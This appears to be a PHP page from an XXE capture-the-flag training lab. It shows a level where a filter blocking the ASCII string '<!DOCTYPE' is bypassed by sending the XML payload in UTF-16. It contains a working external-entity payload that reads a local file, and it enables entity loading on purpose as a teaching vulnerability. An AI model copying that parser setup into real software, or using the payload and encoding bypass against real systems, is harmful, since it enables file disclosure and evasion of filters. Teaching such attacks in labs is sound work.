<?php
require_once __DIR__ . '/helpers.php';

$levelId    = 7;
$levelTitle = 'DOCTYPE Filter — Encoding Bypass';
$prevLevel  = 6;
$nextLevel  = 8;

$sample = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///var/secret/flag7.txt\">\n]>\n<root>&xxe;</root>";

// ── Challenge logic: WAF blocks the ASCII string "<!DOCTYPE" ──
$xmlInput   = $_POST['xml'] ?? '';
$encoding   = $_POST['encoding'] ?? 'UTF-8';
$allowedEnc = ['UTF-8', 'UTF-16', 'UTF-16LE', 'UTF-16BE'];
if (!in_array($encoding, $allowedEnc, true)) $encoding = 'UTF-8';

$flag       = '';
$output     = null;
$parseError = '';
$blocked    = false;
$submitted  = false;

if (trim($xmlInput) !== '') {
    $submitted = true;

    // Emulate the client transmitting the document in the chosen charset.
    switch ($encoding) {
        case 'UTF-16':   $raw = (string)iconv('UTF-8', 'UTF-16',   $xmlInput); break;           // BOM included
        case 'UTF-16LE': $raw = "\xFF\xFE" . (string)iconv('UTF-8', 'UTF-16LE', $xmlInput); break;
        case 'UTF-16BE': $raw = "\xFE\xFF" . (string)iconv('UTF-8', 'UTF-16BE', $xmlInput); break;
        default:         $raw = $xmlInput; break;                                                // UTF-8
    }

    // WAF: reject anything containing the ASCII marker "<!DOCTYPE".
    if (stripos($raw, '<!DOCTYPE') !== false) {
        $blocked = true;
    } else {
        xxe_register_loader();
        libxml_use_internal_errors(true);
        libxml_clear_errors();
        $dom = new DOMDocument();
        $ok  = @$dom->loadXML($raw, LIBXML_NOENT | LIBXML_DTDLOAD);   // ← libxml auto-detects UTF-16
        if ($ok) {
            $output = $dom->textContent;
        } else {
            $errs = libxml_get_errors();
            $parseError = trim(implode("\n", array_map(fn($e) => trim($e->message), $errs)));
            $output = '[XML parse failed]';
        }
        libxml_clear_errors();

        if (xxe_contains_flag($output, get_flag_for_level($levelId))) {
            $flag = get_flag_for_level($levelId);
        }
    }
}

$hints = get_level_hints($levelId);
$_flag_result = handle_inline_flag_submit($levelId);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 7 — <?= htmlspecialchars($levelTitle) ?> | XXE Lab</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>

<header class="header">
    <a href="index.php" class="back-btn">&larr; Back to Levels</a>
    <div class="header-title"><span style="color:var(--primary)">&#x1F5CE;</span> XXE Lab</div>
    <a href="submit.php" class="submit-link">Submit Flag</a>
</header>

<div class="container">

    <div class="level-header">
        <span class="level-badge">Level 7</span>
        <h1><?= htmlspecialchars($levelTitle) ?></h1>
        <span class="difficulty-badge difficulty-hard">Hard</span>
    </div>

    <div class="challenge-layout">
        <div class="code-panel">
            <h3>Vulnerable Source Code</h3>
            <div class="source-code">
                <pre><code><span class="php-keyword">&lt;?php</span>
<span class="php-comment">// level7.php — the received bytes are $raw</span>
<span class="php-variable">$raw</span> = <span class="php-function">file_get_contents</span>(<span class="php-string">'php://input'</span>);

<span class="php-comment">// WAF: block the ASCII marker "&lt;!DOCTYPE"</span>
<span class="vuln-line"><span class="php-keyword">if</span> (<span class="php-function">stripos</span>(<span class="php-variable">$raw</span>, <span class="php-string">'&lt;!DOCTYPE'</span>) !== <span class="php-keyword">false</span>) <span class="php-function">die</span>(<span class="php-string">'WAF: DOCTYPE blocked'</span>);</span>

<span class="php-function">xxe_register_loader</span>();
<span class="php-variable">$dom</span> = <span class="php-keyword">new</span> <span class="php-function">DOMDocument</span>();
<span class="php-variable">$dom</span>-&gt;<span class="php-function">loadXML</span>(<span class="php-variable">$raw</span>, <span class="php-keyword">LIBXML_NOENT</span> | <span class="php-keyword">LIBXML_DTDLOAD</span>);
<span class="php-keyword">echo</span> <span class="php-variable">$dom</span>-&gt;textContent;<span class="php-keyword">?&gt;</span></code></pre>
            </div>
            <div class="vuln-annotation">
                <strong>Vulnerability:</strong>&nbsp; The WAF only matches the <em>ASCII</em> bytes of
                <code>&lt;!DOCTYPE</code>. libxml detects the charset from the BOM, so a <strong>UTF-16</strong>
                document parses fine while the filter sees nothing. Use the encoding selector below to send UTF-16.
            </div>
        </div>

        <div class="challenge-panel">
            <div style="padding:1rem;">
                <div class="scenario">
                    <h3>Scenario</h3>
                    <p>An API gateway blocks any body containing <code>&lt;!DOCTYPE</code>. Submit your payload as
                    <strong>UTF-16</strong> so the marker's bytes change — libxml still parses it. Target
                    <code>/var/secret/flag7.txt</code>.</p>
                    <p style="margin-top:0.4rem;">Payload:</p>
                    <div class="sample-xml"><?= htmlspecialchars($sample) ?></div>
                </div>

                <form method="post" action="level7.php">
                    <div class="form-group">
                        <label class="form-label" for="xml_input">XML Payload</label>
                        <textarea id="xml_input" name="xml" class="form-control" spellcheck="false" autocomplete="off"><?= htmlspecialchars($xmlInput !== '' ? $xmlInput : $sample) ?></textarea>
                    </div>
                    <div class="form-group">
                        <label class="form-label" for="encoding">Transfer encoding (how the bytes are sent)</label>
                        <select name="encoding" id="encoding" class="form-control encoding-select">
                            <?php foreach ($allowedEnc as $e): ?>
                            <option value="<?= $e ?>" <?= $encoding === $e ? 'selected' : '' ?>><?= $e ?></option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                    <div style="display:flex; gap:0.6rem; margin-top:0.5rem; flex-wrap:wrap;">
                        <button type="submit" class="btn btn-primary">Send to Gateway</button>
                        <a href="level7.php" class="btn btn-secondary">Reset</a>
                    </div>
                </form>

                <?php if ($blocked): ?>
                <div class="message error">&#x1F6E1; WAF blocked the request: the ASCII string <code>&lt;!DOCTYPE</code> was detected. Try a different transfer encoding.</div>
                <?php elseif ($output !== null): ?>
                <div style="margin-top:1rem;">
                    <label class="form-label">Parsed document text (<?= htmlspecialchars($encoding) ?>)</label>
                    <div class="output-box <?= trim((string)$output) === '' ? 'empty' : '' ?>"><?= htmlspecialchars((string)$output) ?></div>
                    <?php if ($parseError !== ''): ?>
                    <label class="form-label" style="margin-top:0.5rem;">libxml errors</label>
                    <div class="output-box"><?= htmlspecialchars($parseError) ?></div>
                    <?php endif; ?>
                </div>
                <?php endif; ?>

                <?php if ($flag): ?>
                <div class="flag-display">
                    <h3>&#x1F3C6; Flag Captured!</h3>
                    <p>The UTF-16 bytes slipped past the ASCII filter and libxml parsed the DOCTYPE anyway.</p>
                    <code><?= htmlspecialchars($flag) ?></code>
                    <p style="margin-top:0.75rem;"><a href="submit.php" style="color:#6f9fb0;">Submit this flag &rarr;</a></p>
                </div>
                <?php elseif ($submitted && !$blocked): ?>
                <div class="message error">Parsed, but no flag. Make sure the entity reads <code>/var/secret/flag7.txt</code> and is referenced in the body.</div>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <?= render_hint_section($hints) ?>
    <?= render_inline_flag_form($levelId, $_flag_result) ?>

    <div class="navigation">
        <a href="level<?= $prevLevel ?>.php" class="btn btn-secondary">&larr; Level <?= $prevLevel ?></a>
        <a href="submit.php" class="btn btn-secondary nav-center">Submit Flag</a>
        <a href="level<?= $nextLevel ?>.php" class="btn btn-secondary">Level <?= $nextLevel ?> &rarr;</a>
    </div>

</div>
</body>
</html>
